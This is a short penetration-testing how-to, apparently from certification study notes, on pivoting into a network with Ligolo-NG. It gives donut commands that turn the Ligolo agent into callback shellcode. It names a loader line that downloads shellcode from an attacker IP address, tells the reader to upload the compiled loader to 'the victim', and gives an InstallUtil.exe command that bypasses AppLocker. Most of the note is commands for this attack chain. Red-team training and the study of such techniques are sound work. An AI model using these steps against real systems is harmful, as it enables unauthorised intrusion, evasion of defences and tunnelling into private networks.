# Ligolo-NG
For pivoting I mostly use [Ligolo-NG](https://github.com/nicocha30/ligolo-ng).

## Steps
1. Download the ligolo agent (`agent.exe`).
2. Generate it as a shellcode using [donut](https://github.com/thewover/donut).
```powershell
.\donut.exe  -f 1 -o .\ligolo-agent.bin -a 2 -p "-connect <server>:<port> -ignore-cert" -i agent.exe
```
> [!Note]
> Don't forget to update your `<server>` and `<port>` with your Ligolo proxy address.

Where:
| Switch | Argument | Description |
|:-------|:---------|:------------|
| `-a` | `arch` | Target architecture for loader: `1`=x86, `2`=amd64, `3`=x86+amd64 (default) |
| `-f` | `format` | The output format of loader saved to file: `1`=Binary (default), `2`=Base64, `3`=C, `4`=Ruby, `5`=Python, `6`=PowerShell, `7`=C#, `8`=Hexadecimal |
| `-o` | `path` | Specifies where Donut should save the loader. Default is `loader.bin` in the current directory |
| `-p` | `parameters` | Optional parameters/command line inside quotations for DLL method/function or EXE |
| `-i` | `--input: "path"` , `--file: "path"` | Input file to execute in-memory |

3. To run the shellcode use any shellcode loader, for example [this Applocker loader](https://github.com/VictorNS69/osep-material/blob/main/evasion/ApplockerBypass/ApplockerRevShell/Program.cs).
> [!NOTE]
> Update the following line with your IP and filename in the Applocker loader.
> ```cs
> string shellcodeUrl = "http://192.168.45.224:80/beacons/agent.x64.bin";
> ```

4. Compile the Applocker loader and upload to the victim.
5. Run the binary with `InstallUtil.exe`.
```powershell
C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U ligolo.exe
```
